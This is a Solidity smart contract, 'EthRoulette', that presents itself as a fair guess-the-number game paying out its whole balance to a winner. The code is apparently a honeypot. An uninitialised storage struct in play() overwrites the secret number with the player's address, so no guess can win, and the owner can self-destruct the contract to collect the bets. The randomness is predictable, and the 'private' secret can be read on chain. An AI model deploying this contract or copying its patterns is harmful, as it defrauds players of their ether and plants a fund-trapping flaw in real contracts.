1 // EthRoulette
2 //
3 // Guess the number secretly stored in the blockchain and win the whole contract balance!
4 // A new number is randomly chosen after each try.
5 //
6 // To play, call the play() method with the guessed number (1-20).  Bet price: 0.1 ether
7 
8 contract EthRoulette {
9 
10     uint256 private secretNumber;
11     uint256 public lastPlayed;
12     uint256 public betPrice = 0.1 ether;
13     address public ownerAddr;
14 
15     struct Game {
16         address player;
17         uint256 number;
18     }
19     Game[] public gamesPlayed;
20 
21     function EthRoulette() public {
22         ownerAddr = msg.sender;
23         shuffle();
24     }
25 
26     function shuffle() internal {
27         // randomly set secretNumber with a value between 1 and 20
28         secretNumber = uint8(sha3(now, block.blockhash(block.number-1))) % 20 + 1;
29     }
30 
31     function play(uint256 number) payable public {
32         require(msg.value >= betPrice && number <= 20);
33 
34         Game game;
35         game.player = msg.sender;
36         game.number = number;
37         gamesPlayed.push(game);
38 
39         if (number == secretNumber) {
40             // win!
41             msg.sender.transfer(this.balance);
42         }
43 
44         shuffle();
45         lastPlayed = now;
46     }
47 
48     function kill() public {
49         if (msg.sender == ownerAddr && now > lastPlayed + 1 days) {
50             suicide(msg.sender);
51         }
52     }
53 
54     function() public payable { }
55 }